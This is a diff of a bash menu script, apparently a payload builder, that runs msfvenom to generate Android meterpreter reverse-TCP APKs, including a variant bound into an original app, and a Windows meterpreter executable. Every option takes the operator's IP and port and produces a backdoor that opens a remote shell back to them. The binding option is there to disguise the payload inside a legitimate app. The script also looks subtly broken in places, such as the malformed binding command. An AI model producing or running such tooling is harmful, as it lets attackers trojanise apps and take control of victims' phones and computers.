@@ -5,30 +5,38 @@ printf "\n\n1.android\n2.windows\n3.mac os\n"
 read n
 case $n in
 1)
-echo -n "making payload for android devices: "
+printf "\n\t\t<<<<---:ANDROID PAYLOAD SECTION:--->>>>"
 printf "\n1.apk only\n2.binded apk(signed)\n3.persistence apk\n"
 read x
-case $x in
-1)
-echo -n "enter your ip: "
-read i_p
-echo -n "enter port: "
-read p
-echo -n "enter name of apk: "
-read nm
-msfvenom -p android/meterpreter/reverse_tcp lhost="$i_p" lport="$p" R> $nm.apk
-;;
+        case $x in
+        1)
+        echo -n "enter your ip: "
+        read i_p
+        echo -n "enter port: "
+        read p
+        echo -n "enter name of apk: "
+        read nm
+        msfvenom -p android/meterpreter/reverse_tcp lhost="$i_p" lport="$p" R> $nm.apk
+        ;;
+        2)
+        echo -n "enter your ip: "
+        read i_p
+        echo -n "enter port: "
+        read p
+        echo -n "enter name of apk: "
+        read nm
+        echo -n "attach original apk for binding: "
+        read f
+        msfvenom -p android/meterpreter/reverse_tcp lhost="$i_p" lport="$p" R> $nm.apk $f
+        ;;
+        esac;;
 2)
-echo -n "enter your ip: "
-read i_p
-echo -n "enter port: "
-read p
-echo -n "enter name of apk: "
-read nm
-echo -n "attach original apk for binding: "
-read f
-msfvenom -p android/meterpreter/reverse_tcp lhost="$i_p" lport="$p" R> $nm.apk $f
-;;
-esac;;
+        printf "\n\t\t<<<<---:WINDOWS PAYLOAD SECTION :--->>>>\n\n"
+        echo -n "enter your ip: "
+        read i_p
+        echo -n "enter port: "
+        read p
+        echo -n "enter name of exe: "
+        read nm
+        msfvenom -p windows/meterpreter/reverse_tcp lhost="$i_p" lport="$p" R> $nm.exe
 esac
-done
